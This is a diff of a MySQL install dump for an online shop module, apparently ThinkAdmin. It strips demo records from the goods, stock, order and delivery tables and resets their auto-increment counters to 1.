-INSERT INTO `shop_goods_item` VALUES (31, 'S71018527222', 'G7111527990497', '颜色::黑色', 0, 1111, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:26:39');
-INSERT INTO `shop_goods_item` VALUES (32, 'S71018527290', 'G7111527990497', '颜色::规格属性2', 0, 0, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:26:39');
-INSERT INTO `shop_goods_item` VALUES (33, 'S71018527437', 'G7111527990497', '颜色::规格属性3', 0, 0, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:26:39');
-INSERT INTO `shop_goods_item` VALUES (34, 'S71018527222', 'G7111528021978', '颜色::黑色', 0, 10, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:26:42');
-INSERT INTO `shop_goods_item` VALUES (35, 'S71018527290', 'G7111528021978', '颜色::规格属性2', 0, 30, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:26:42');
-INSERT INTO `shop_goods_item` VALUES (36, 'S71018527437', 'G7111528021978', '颜色::规格属性3', 0, 50, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:26:42');
-INSERT INTO `shop_goods_item` VALUES (37, 'S71018527222', 'G7111528077727', '颜色::黑色', 0, 133, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:26:47');
-INSERT INTO `shop_goods_item` VALUES (38, 'S71018527290', 'G7111528077727', '颜色::规格属性2', 0, 249, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:26:47');
-INSERT INTO `shop_goods_item` VALUES (39, 'S71018527437', 'G7111528077727', '颜色::规格属性3', 0, 250, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-01-20 22:26:47');
-INSERT INTO `shop_goods_item` VALUES (40, 'S71018527222', 'G7112213646771', '颜色::黑色', 0, 10, 99.00, 100.00, 5, 2, 0.00, 0.00, 1, '2021-01-21 17:29:24');
-INSERT INTO `shop_goods_item` VALUES (41, 'S71018527290', 'G7112213646771', '颜色::规格属性2', 0, 20, 99.00, 100.00, 5, 2, 0.00, 0.00, 1, '2021-01-21 17:29:24');
-INSERT INTO `shop_goods_item` VALUES (42, 'S71018527437', 'G7112213646771', '颜色::规格属性3', 0, 0, 99.00, 100.00, 5, 2, 0.00, 0.00, 0, '2021-01-21 17:29:24');
-INSERT INTO `shop_goods_item` VALUES (43, 'S71018527222', 'G7122345603086', '颜色::黑色', 0, 0, 99.00, 100.00, 5, 1, 0.00, 0.00, 0, '2021-02-02 10:56:00');
-INSERT INTO `shop_goods_item` VALUES (44, 'S71018527290', 'G7122345603086', '颜色::规格属性2', 0, 0, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-02-02 10:56:00');
-INSERT INTO `shop_goods_item` VALUES (45, 'S71018527437', 'G7122345603086', '颜色::规格属性3', 0, 0, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-02-02 10:56:00');
-INSERT INTO `shop_goods_item` VALUES (46, 'S7137603953297', 'G7137603957250', '默认分组::默认规格', 0, 0, 2.00, 3.00, 100, 1, 0.00, 0.00, 1, '2021-02-20 02:48:38');
-INSERT INTO `shop_goods_item` VALUES (47, 'S71018527222', 'G7138029504945', '颜色::黑色', 0, 0, 99.00, 100.00, 5, 1, 0.00, 0.00, 0, '2021-02-20 14:35:50');
-INSERT INTO `shop_goods_item` VALUES (48, 'S71018527290', 'G7138029504945', '颜色::规格属性2', 0, 0, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-02-20 14:35:50');
-INSERT INTO `shop_goods_item` VALUES (49, 'S71018527437', 'G7138029504945', '颜色::规格属性3', 0, 0, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-02-20 14:35:50');
-INSERT INTO `shop_goods_item` VALUES (50, 'S7140657870839', 'G7140657326678', '颜色::黑色;;尺寸::150', 0, 100, 52.00, 100.00, 10, 1, 0.00, 0.00, 1, '2021-02-23 15:39:24');
-INSERT INTO `shop_goods_item` VALUES (51, 'S7140657918647', 'G7140657326678', '颜色::黑色;;尺寸::130', 0, 100, 64.00, 100.00, 20, 1, 0.00, 0.00, 1, '2021-02-23 15:39:24');
-INSERT INTO `shop_goods_item` VALUES (52, 'S7140657958510', 'G7140657326678', '颜色::黑色;;尺寸::300', 0, 100, 77.00, 100.00, 4, 1, 0.00, 0.00, 1, '2021-02-23 15:39:24');
-INSERT INTO `shop_goods_item` VALUES (53, 'S71406578726610', 'G7140657326678', '颜色::白色;;尺寸::150', 0, 100, 65.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-02-23 15:39:24');
-INSERT INTO `shop_goods_item` VALUES (54, 'S7140657916753', 'G7140657326678', '颜色::白色;;尺寸::130', 0, 100, 95.00, 100.00, 7, 1, 0.00, 0.00, 1, '2021-02-23 15:39:24');
-INSERT INTO `shop_goods_item` VALUES (55, 'S7140657957296', 'G7140657326678', '颜色::白色;;尺寸::300', 0, 100, 75.00, 100.00, 8, 1, 0.00, 0.00, 1, '2021-02-23 15:39:24');
-INSERT INTO `shop_goods_item` VALUES (56, 'S7140657872786', 'G7140657326678', '颜色::红色;;尺寸::150', 0, 100, 96.00, 100.00, 0, 1, 0.00, 0.00, 1, '2021-02-23 15:39:24');
-INSERT INTO `shop_goods_item` VALUES (57, 'S7140657917545', 'G7140657326678', '颜色::红色;;尺寸::130', 0, 100, 45.00, 100.00, 1, 1, 0.00, 0.00, 1, '2021-02-23 15:39:24');
-INSERT INTO `shop_goods_item` VALUES (58, 'S7140657959821', 'G7140657326678', '颜色::红色;;尺寸::300', 0, 100, 99.00, 100.00, 0, 1, 0.00, 0.00, 1, '2021-02-23 15:39:24');
-INSERT INTO `shop_goods_item` VALUES (59, 'S7140657870839', 'G7140731152507', '颜色::黑色;;尺寸::150', 0, 5, 52.00, 100.00, 10, 1, 0.00, 0.00, 1, '2021-02-23 17:38:35');
-INSERT INTO `shop_goods_item` VALUES (60, 'S7140657918647', 'G7140731152507', '颜色::黑色;;尺寸::130', 0, 0, 64.00, 100.00, 20, 1, 0.00, 0.00, 1, '2021-02-23 17:38:35');
-INSERT INTO `shop_goods_item` VALUES (61, 'S7140657958510', 'G7140731152507', '颜色::黑色;;尺寸::300', 0, 10, 77.00, 100.00, 4, 1, 0.00, 0.00, 1, '2021-02-23 17:38:35');
-INSERT INTO `shop_goods_item` VALUES (62, 'S71406578726610', 'G7140731152507', '颜色::白色;;尺寸::150', 0, 5, 65.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-02-23 17:38:35');
-INSERT INTO `shop_goods_item` VALUES (63, 'S7140657916753', 'G7140731152507', '颜色::白色;;尺寸::130', 0, 10, 95.00, 100.00, 7, 1, 0.00, 0.00, 1, '2021-02-23 17:38:35');
-INSERT INTO `shop_goods_item` VALUES (64, 'S7140657957296', 'G7140731152507', '颜色::白色;;尺寸::300', 0, 0, 75.00, 100.00, 8, 1, 0.00, 0.00, 1, '2021-02-23 17:38:35');
-INSERT INTO `shop_goods_item` VALUES (65, 'S7140657872786', 'G7140731152507', '颜色::红色;;尺寸::150', 0, 10, 96.00, 100.00, 0, 1, 0.00, 0.00, 1, '2021-02-23 17:38:35');
-INSERT INTO `shop_goods_item` VALUES (66, 'S7140657917545', 'G7140731152507', '颜色::红色;;尺寸::130', 0, 0, 45.00, 100.00, 1, 1, 0.00, 0.00, 1, '2021-02-23 17:38:35');
-INSERT INTO `shop_goods_item` VALUES (67, 'S7140657959821', 'G7140731152507', '颜色::红色;;尺寸::300', 0, 5, 99.00, 100.00, 0, 1, 0.00, 0.00, 1, '2021-02-23 17:38:35');
-INSERT INTO `shop_goods_item` VALUES (68, 'S71018527222', 'G7141314710092', '颜色::黑色', 0, 0, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-02-24 09:51:11');
-INSERT INTO `shop_goods_item` VALUES (69, 'S71018527290', 'G7141314710092', '颜色::规格属性2', 0, 0, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-02-24 09:51:11');
-INSERT INTO `shop_goods_item` VALUES (70, 'S71018527437', 'G7141314710092', '颜色::规格属性3', 0, 0, 99.00, 100.00, 5, 1, 0.00, 0.00, 1, '2021-02-24 09:51:11');
 
 -- ----------------------------
 -- Table structure for shop_goods_mark
@@ -797,19 +529,11 @@ CREATE TABLE `shop_goods_mark`  (
   PRIMARY KEY (`id`) USING BTREE,
   INDEX `idx_shop_goods_mark_sort`(`sort`) USING BTREE,
   INDEX `idx_shop_goods_mark_status`(`status`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 9 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-商品-标签' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-商品-标签' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of shop_goods_mark
 -- ----------------------------
-INSERT INTO `shop_goods_mark` VALUES (1, '111', '', 0, 1, '2021-01-18 17:46:39');
-INSERT INTO `shop_goods_mark` VALUES (2, '11', '', 0, 1, '2021-01-29 11:30:42');
-INSERT INTO `shop_goods_mark` VALUES (3, '123', '', 0, 1, '2021-01-29 14:19:53');
-INSERT INTO `shop_goods_mark` VALUES (4, '444', '', 0, 1, '2021-01-29 14:19:57');
-INSERT INTO `shop_goods_mark` VALUES (5, '3132', '', 0, 1, '2021-01-29 14:20:00');
-INSERT INTO `shop_goods_mark` VALUES (6, '444', '', 0, 1, '2021-01-29 14:20:04');
-INSERT INTO `shop_goods_mark` VALUES (7, '555', '', 0, 1, '2021-01-29 14:20:07');
-INSERT INTO `shop_goods_mark` VALUES (8, '777', '', 0, 1, '2021-01-29 14:20:11');
 
 -- ----------------------------
 -- Table structure for shop_goods_stock
@@ -827,77 +551,11 @@ CREATE TABLE `shop_goods_stock`  (
   PRIMARY KEY (`id`) USING BTREE,
   INDEX `idx_data_news_item_status`(`status`) USING BTREE,
   INDEX `idx_data_news_item_deleted`(`deleted`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 67 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-商品-库存' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-商品-库存' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of shop_goods_stock
 -- ----------------------------
-INSERT INTO `shop_goods_stock` VALUES (1, 'B2021010925276', 'G7101852191255', '颜色::黑色', 4, 1, 0, '2021-01-09 22:03:27');
-INSERT INTO `shop_goods_stock` VALUES (2, 'B2021011422376', 'G7101852191255', '颜色::黑色', 232, 1, 0, '2021-01-14 14:08:37');
-INSERT INTO `shop_goods_stock` VALUES (3, 'B2021012042530', 'G7101852191255', '颜色::黑色', 100, 1, 0, '2021-01-20 22:20:53');
-INSERT INTO `shop_goods_stock` VALUES (4, 'B2021012042530', 'G7101852191255', '颜色::规格属性2', 100, 1, 0, '2021-01-20 22:20:53');
-INSERT INTO `shop_goods_stock` VALUES (5, 'B2021012042530', 'G7101852191255', '颜色::规格属性3', 100, 1, 0, '2021-01-20 22:20:53');
-INSERT INTO `shop_goods_stock` VALUES (6, 'B2021012043069', 'G7110723823961', '颜色::黑色', 999, 1, 0, '2021-01-20 22:21:06');
-INSERT INTO `shop_goods_stock` VALUES (7, 'B2021012043069', 'G7110723823961', '颜色::规格属性2', 999, 1, 0, '2021-01-20 22:21:06');
-INSERT INTO `shop_goods_stock` VALUES (8, 'B2021012043069', 'G7110723823961', '颜色::规格属性3', 999, 1, 0, '2021-01-20 22:21:06');
-INSERT INTO `shop_goods_stock` VALUES (9, 'B2021012043232', 'G7106171904105', '颜色::白色;;内存::68;;类型::阉割版', 1234, 1, 0, '2021-01-20 22:21:23');
-INSERT INTO `shop_goods_stock` VALUES (10, 'B2021012043232', 'G7106171904105', '颜色::白色;;内存::68;;类型::正常班', 212, 1, 0, '2021-01-20 22:21:23');
-INSERT INTO `shop_goods_stock` VALUES (11, 'B2021012043232', 'G7106171904105', '颜色::白色;;内存::68;;类型::加强版', 22, 1, 0, '2021-01-20 22:21:23');
-INSERT INTO `shop_goods_stock` VALUES (12, 'B2021012043232', 'G7106171904105', '颜色::白色;;内存::125;;类型::阉割版', 33, 1, 0, '2021-01-20 22:21:23');
-INSERT INTO `shop_goods_stock` VALUES (13, 'B2021012043232', 'G7106171904105', '颜色::白色;;内存::125;;类型::正常班', 444, 1, 0, '2021-01-20 22:21:23');
-INSERT INTO `shop_goods_stock` VALUES (14, 'B2021012043232', 'G7106171904105', '颜色::白色;;内存::125;;类型::加强版', 555, 1, 0, '2021-01-20 22:21:23');
-INSERT INTO `shop_goods_stock` VALUES (15, 'B2021012043232', 'G7106171904105', '颜色::黑色;;内存::68;;类型::阉割版', 66, 1, 0, '2021-01-20 22:21:23');
-INSERT INTO `shop_goods_stock` VALUES (16, 'B2021012043232', 'G7106171904105', '颜色::黑色;;内存::68;;类型::正常班', 77, 1, 0, '2021-01-20 22:21:23');
-INSERT INTO `shop_goods_stock` VALUES (17, 'B2021012043232', 'G7106171904105', '颜色::黑色;;内存::68;;类型::加强版', 7877, 1, 0, '2021-01-20 22:21:23');
-INSERT INTO `shop_goods_stock` VALUES (18, 'B2021012043232', 'G7106171904105', '颜色::黑色;;内存::125;;类型::阉割版', 88, 1, 0, '2021-01-20 22:21:23');
-INSERT INTO `shop_goods_stock` VALUES (19, 'B2021012043232', 'G7106171904105', '颜色::黑色;;内存::125;;类型::正常班', 77, 1, 0, '2021-01-20 22:21:23');
-INSERT INTO `shop_goods_stock` VALUES (20, 'B2021012053081', 'G7111527421908', '颜色::黑色', 10, 1, 0, '2021-01-20 22:31:08');
-INSERT INTO `shop_goods_stock` VALUES (21, 'B2021012053081', 'G7111527421908', '颜色::规格属性2', 20, 1, 0, '2021-01-20 22:31:08');
-INSERT INTO `shop_goods_stock` VALUES (22, 'B2021012053081', 'G7111527421908', '颜色::规格属性3', 30, 1, 0, '2021-01-20 22:31:08');
-INSERT INTO `shop_goods_stock` VALUES (23, 'B2021012559088', 'G7112213646771', '颜色::黑色', 10, 1, 0, '2021-01-25 15:44:08');
-INSERT INTO `shop_goods_stock` VALUES (24, 'B2021012559088', 'G7112213646771', '颜色::规格属性2', 20, 1, 0, '2021-01-25 15:44:08');
-INSERT INTO `shop_goods_stock` VALUES (25, 'B2021012559223', 'G7111528077727', '颜色::黑色', 10, 1, 0, '2021-01-25 15:44:22');
-INSERT INTO `shop_goods_stock` VALUES (26, 'B2021012559223', 'G7111528077727', '颜色::规格属性2', 20, 1, 0, '2021-01-25 15:44:22');
-INSERT INTO `shop_goods_stock` VALUES (27, 'B2021012559223', 'G7111528077727', '颜色::规格属性3', 30, 1, 0, '2021-01-25 15:44:22');
-INSERT INTO `shop_goods_stock` VALUES (28, 'B2021012957062', 'G7111527990497', '颜色::黑色', 1111, 1, 0, '2021-01-29 14:43:06');
-INSERT INTO `shop_goods_stock` VALUES (29, 'B2021013040335', 'G7111528077727', '颜色::黑色', 1, 1, 0, '2021-01-30 17:23:33');
-INSERT INTO `shop_goods_stock` VALUES (30, 'B2021013040459', 'G7111528077727', '颜色::黑色', 1, 1, 0, '2021-01-30 17:23:45');
-INSERT INTO `shop_goods_stock` VALUES (31, 'B2021013156321', 'G7111528077727', '颜色::规格属性2', 99, 1, 0, '2021-01-31 11:45:32');
-INSERT INTO `shop_goods_stock` VALUES (32, 'B2021013156416', 'G7111528077727', '颜色::规格属性3', 99, 1, 0, '2021-01-31 11:45:41');
-INSERT INTO `shop_goods_stock` VALUES (33, 'B2021020317598', 'G7111528077727', '颜色::黑色', 1, 1, 0, '2021-02-03 15:02:59');
-INSERT INTO `shop_goods_stock` VALUES (34, 'B2021020317598', 'G7111528077727', '颜色::规格属性2', 10, 1, 0, '2021-02-03 15:02:59');
-INSERT INTO `shop_goods_stock` VALUES (35, 'B2021020317598', 'G7111528077727', '颜色::规格属性3', 1, 1, 0, '2021-02-03 15:02:59');
-INSERT INTO `shop_goods_stock` VALUES (36, 'B2021020560580', 'G7111528077727', '颜色::黑色', 10, 1, 0, '2021-02-05 11:49:58');
-INSERT INTO `shop_goods_stock` VALUES (37, 'B2021020560580', 'G7111528077727', '颜色::规格属性2', 10, 1, 0, '2021-02-05 11:49:58');
-INSERT INTO `shop_goods_stock` VALUES (38, 'B2021020560580', 'G7111528077727', '颜色::规格属性3', 10, 1, 0, '2021-02-05 11:49:58');
-INSERT INTO `shop_goods_stock` VALUES (39, 'B2021020561133', 'G7111528077727', '颜色::黑色', 100, 1, 0, '2021-02-05 11:50:13');
-INSERT INTO `shop_goods_stock` VALUES (40, 'B2021020561133', 'G7111528077727', '颜色::规格属性2', 100, 1, 0, '2021-02-05 11:50:13');
-INSERT INTO `shop_goods_stock` VALUES (41, 'B2021020561133', 'G7111528077727', '颜色::规格属性3', 100, 1, 0, '2021-02-05 11:50:13');
-INSERT INTO `shop_goods_stock` VALUES (42, 'B2021020646304', 'G7111528077727', '颜色::黑色', 10, 1, 0, '2021-02-06 09:37:30');
-INSERT INTO `shop_goods_stock` VALUES (43, 'B2021020646304', 'G7111528077727', '颜色::规格属性2', 10, 1, 0, '2021-02-06 09:37:30');
-INSERT INTO `shop_goods_stock` VALUES (44, 'B2021020646304', 'G7111528077727', '颜色::规格属性3', 10, 1, 0, '2021-02-06 09:37:30');
-INSERT INTO `shop_goods_stock` VALUES (45, 'B2021021455445', 'G7111527534526', '颜色::黑色', 1, 1, 0, '2021-02-14 17:38:45');
-INSERT INTO `shop_goods_stock` VALUES (46, 'B2021022358356', 'G7111527534526', '颜色::黑色', 1100, 1, 0, '2021-02-23 14:44:35');
-INSERT INTO `shop_goods_stock` VALUES (47, 'B2021022358356', 'G7111527534526', '颜色::规格属性2', 120, 1, 0, '2021-02-23 14:44:35');
-INSERT INTO `shop_goods_stock` VALUES (48, 'B2021022358356', 'G7111527534526', '颜色::规格属性3', 1600, 1, 0, '2021-02-23 14:44:35');
-INSERT INTO `shop_goods_stock` VALUES (49, 'B2021022355180', 'G7140657326678', '颜色::黑色;;尺寸::150', 100, 1, 0, '2021-02-23 15:40:18');
-INSERT INTO `shop_goods_stock` VALUES (50, 'B2021022355180', 'G7140657326678', '颜色::黑色;;尺寸::130', 100, 1, 0, '2021-02-23 15:40:18');
-INSERT INTO `shop_goods_stock` VALUES (51, 'B2021022355180', 'G7140657326678', '颜色::黑色;;尺寸::300', 100, 1, 0, '2021-02-23 15:40:18');
-INSERT INTO `shop_goods_stock` VALUES (52, 'B2021022355180', 'G7140657326678', '颜色::白色;;尺寸::150', 100, 1, 0, '2021-02-23 15:40:18');
-INSERT INTO `shop_goods_stock` VALUES (53, 'B2021022355180', 'G7140657326678', '颜色::白色;;尺寸::130', 100, 1, 0, '2021-02-23 15:40:18');
-INSERT INTO `shop_goods_stock` VALUES (54, 'B2021022355180', 'G7140657326678', '颜色::白色;;尺寸::300', 100, 1, 0, '2021-02-23 15:40:18');
-INSERT INTO `shop_goods_stock` VALUES (55, 'B2021022355180', 'G7140657326678', '颜色::红色;;尺寸::150', 100, 1, 0, '2021-02-23 15:40:18');
-INSERT INTO `shop_goods_stock` VALUES (56, 'B2021022355180', 'G7140657326678', '颜色::红色;;尺寸::130', 100, 1, 0, '2021-02-23 15:40:18');
-INSERT INTO `shop_goods_stock` VALUES (57, 'B2021022355180', 'G7140657326678', '颜色::红色;;尺寸::300', 100, 1, 0, '2021-02-23 15:40:18');
-INSERT INTO `shop_goods_stock` VALUES (58, 'B2021022356306', 'G7140731152507', '颜色::黑色;;尺寸::150', 5, 1, 0, '2021-02-23 17:39:30');
-INSERT INTO `shop_goods_stock` VALUES (59, 'B2021022356306', 'G7140731152507', '颜色::黑色;;尺寸::300', 10, 1, 0, '2021-02-23 17:39:30');
-INSERT INTO `shop_goods_stock` VALUES (60, 'B2021022356306', 'G7140731152507', '颜色::白色;;尺寸::150', 5, 1, 0, '2021-02-23 17:39:30');
-INSERT INTO `shop_goods_stock` VALUES (61, 'B2021022356306', 'G7140731152507', '颜色::白色;;尺寸::130', 10, 1, 0, '2021-02-23 17:39:30');
-INSERT INTO `shop_goods_stock` VALUES (62, 'B2021022356306', 'G7140731152507', '颜色::红色;;尺寸::150', 10, 1, 0, '2021-02-23 17:39:30');
-INSERT INTO `shop_goods_stock` VALUES (63, 'B2021022356306', 'G7140731152507', '颜色::红色;;尺寸::300', 5, 1, 0, '2021-02-23 17:39:30');
-INSERT INTO `shop_goods_stock` VALUES (64, 'B2021022421554', 'G7111528021978', '颜色::黑色', 10, 1, 0, '2021-02-24 17:04:55');
-INSERT INTO `shop_goods_stock` VALUES (65, 'B2021022421554', 'G7111528021978', '颜色::规格属性2', 30, 1, 0, '2021-02-24 17:04:55');
-INSERT INTO `shop_goods_stock` VALUES (66, 'B2021022421554', 'G7111528021978', '颜色::规格属性3', 50, 1, 0, '2021-02-24 17:04:55');
 
 -- ----------------------------
 -- Table structure for shop_order
@@ -933,21 +591,18 @@ CREATE TABLE `shop_order`  (
   `status` tinyint(1) UNSIGNED NULL DEFAULT 1 COMMENT '订单状态(0已取消,1预订单,2待支付,3待发货,4待签收,5已完成)',
   `create_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
   PRIMARY KEY (`id`) USING BTREE,
+  INDEX `idx_shop_order_mid`(`uid`) USING BTREE,
   INDEX `idx_shop_order_from`(`from`) USING BTREE,
   INDEX `idx_shop_order_status`(`status`) USING BTREE,
   INDEX `idx_shop_order_deleted`(`deleted`) USING BTREE,
   INDEX `idx_shop_order_orderno`(`order_no`) USING BTREE,
   INDEX `idx_shop_order_cancel_status`(`cancel_status`) USING BTREE,
-  INDEX `idx_shop_order_payment_status`(`payment_status`) USING BTREE,
-  INDEX `idx_shop_order_mid`(`uid`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 24 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-订单-内容' ROW_FORMAT = COMPACT;
+  INDEX `idx_shop_order_payment_status`(`payment_status`) USING BTREE
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-订单-内容' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of shop_order
 -- ----------------------------
-INSERT INTO `shop_order` VALUES (18, 4, 0, 'N20210120735241195', 98.80, 99.00, 99.00, 0.20, 0.00, 98.80, 0.00, 0, 'balance', 'M7111525366859', '20210120754231652751', 1, 98.80, '账户余额支付', '2021-01-20 22:53:42', 1, 0, '', '', 0, '', '', 4, '2021-01-20 22:51:52');
-INSERT INTO `shop_order` VALUES (22, 3, 0, 'N20210224174060040', 5199.36, 52.00, 52.00, 0.64, 0.00, 0.00, 5200.00, 0, '', '', '', 0, 0.00, '', '', 1, 1, '30分钟未完成支付已自动取消', '2021-02-24 16:31:53', 0, '', '', 0, '2021-02-24 16:01:40');
-INSERT INTO `shop_order` VALUES (23, 3, 0, 'N20210224175990054', 5199.29, 52.00, 52.00, 0.71, 0.00, 0.00, 5200.00, 0, '', '', '', 0, 0.00, '', '', 1, 1, '30分钟未完成支付已自动取消', '2021-02-24 16:32:54', 0, '', '', 0, '2021-02-24 16:01:59');
 
 -- ----------------------------
 -- Table structure for shop_order_item
@@ -988,14 +643,11 @@ CREATE TABLE `shop_order_item`  (
   INDEX `idx_shop_order_item_goods_sku`(`goods_sku`) USING BTREE,
   INDEX `idx_shop_order_item_goods_code`(`goods_code`) USING BTREE,
   INDEX `idx_shop_order_item_goods_spec`(`goods_spec`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 21 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-订单-商品' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-订单-商品' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of shop_order_item
 -- ----------------------------
-INSERT INTO `shop_order_item` VALUES (18, 4, 'N20210120735241195', 'S71018527437', 'G7101852191255', '颜色::规格属性3', '测试商品不发货', 'https://v6.thinkadmin.top/upload/72/8980f7f7b90825a34b92e77699101c.jpg', 100.00, 99.00, 100.00, 99.00, 0.00, 0.00, 1, 0, '', 1, '', 0, 0, 0, 100.000000, 0.00, 1, 0, '2021-01-20 22:51:52');
-INSERT INTO `shop_order_item` VALUES (19, 3, 'N20210224174060040', 'S7140657870839', 'G7140731152507', '颜色::黑色;;尺寸::150', '测试规格哈2', 'https://v6.thinkadmin.top/upload/a6/48a3f96c963488297f9b08236de799.jpg', 100.00, 52.00, 100.00, 52.00, 0.00, 0.00, 1, 0, 'T2021022055462', 1, '', 0, 0, 0, 100.000000, 5200.00, 1, 0, '2021-02-24 16:01:40');
-INSERT INTO `shop_order_item` VALUES (20, 3, 'N20210224175990054', 'S7140657870839', 'G7140731152507', '颜色::黑色;;尺寸::150', '测试规格哈2', 'https://v6.thinkadmin.top/upload/a6/48a3f96c963488297f9b08236de799.jpg', 100.00, 52.00, 100.00, 52.00, 0.00, 0.00, 1, 0, 'T2021022055462', 1, '', 0, 0, 0, 100.000000, 5200.00, 1, 0, '2021-02-24 16:01:59');
 
 -- ----------------------------
 -- Table structure for shop_order_send
@@ -1027,41 +679,15 @@ CREATE TABLE `shop_order_send`  (
   `deleted` tinyint(1) NULL DEFAULT 0 COMMENT '删除状态(0未删,1已删)',
   `create_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
   PRIMARY KEY (`id`) USING BTREE,
+  INDEX `idx_shop_order_send_mid`(`uid`) USING BTREE,
   INDEX `idx_shop_order_send_status`(`status`) USING BTREE,
   INDEX `idx_shop_order_send_deleted`(`deleted`) USING BTREE,
-  INDEX `idx_shop_order_send_order_no`(`order_no`) USING BTREE,
-  INDEX `idx_shop_order_send_mid`(`uid`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 27 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-订单-配送' ROW_FORMAT = COMPACT;
+  INDEX `idx_shop_order_send_order_no`(`order_no`) USING BTREE
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '商城-订单-配送' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of shop_order_send
 -- ----------------------------
-INSERT INTO `shop_order_send` VALUES (1, 18, 'N20210120330165768', 'A2021012033311', '大海', '13188888888', '', '北京市', '北京市', '西城区', '111', '2021-01-20 22:11:32', '', 1, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-20 22:11:32');
-INSERT INTO `shop_order_send` VALUES (2, 8, 'N20210120343990272', 'A2021012035032', '拉塞尔', '15612341234', '', '北京市', '北京市', '东城区', '还白', '2021-01-20 22:13:03', '', 1, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-20 22:13:03');
-INSERT INTO `shop_order_send` VALUES (3, 32, 'N20210120370401041', 'A2021012037344', '仔细', '13888888884', '', '北京市', '北京市', '东城区', '哈哈还差', '2021-01-20 22:15:35', '', 1, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-20 22:15:35');
-INSERT INTO `shop_order_send` VALUES (4, 34, 'N20210120385958499', 'A2021012039397', '12541', '15570038526', '', '山西省', '大同市', '矿区', '心里已买期待收货', '2021-01-20 22:17:39', '', 1, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-20 22:17:39');
-INSERT INTO `shop_order_send` VALUES (5, 34, 'N20210120422900358', 'A2021012039397', '12541', '15570038526', '', '山西省', '大同市', '矿区', '心里已买期待收货', '2021-01-20 22:20:32', '', 1, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-20 22:20:32');
-INSERT INTO `shop_order_send` VALUES (6, 4, 'N20210120433297929', 'A2021012044017', '小小邹', '17620103811', '', '吉林省', '四平市', '伊通满族自治县', '测试地址', '2021-01-20 22:22:02', '', 1, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-20 22:22:02');
-INSERT INTO `shop_order_send` VALUES (7, 42, 'N20210120561627506', 'A2021012057106', '测试', '15111111111', '', '山西省', '阳泉市', '平定县', '惺惺惜惺惺', '2021-01-20 22:35:11', '', 18, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-20 22:35:11');
-INSERT INTO `shop_order_send` VALUES (8, 4, 'N20210120591208095', 'A2021012044017', '小小邹', '17620103811', '', '吉林省', '四平市', '伊通满族自治县', '测试地址', '2021-01-20 22:37:30', '', 1, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-20 22:37:15');
-INSERT INTO `shop_order_send` VALUES (9, 4, 'N20210120614008292', 'A2021012044017', '小小邹', '17620103811', '', '吉林省', '四平市', '伊通满族自治县', '测试地址', '2021-01-20 22:41:59', '', 1, '邮费模板编码无效！', 0.00, '', '', '', '', '', 1, 0, '2021-01-20 22:39:43');
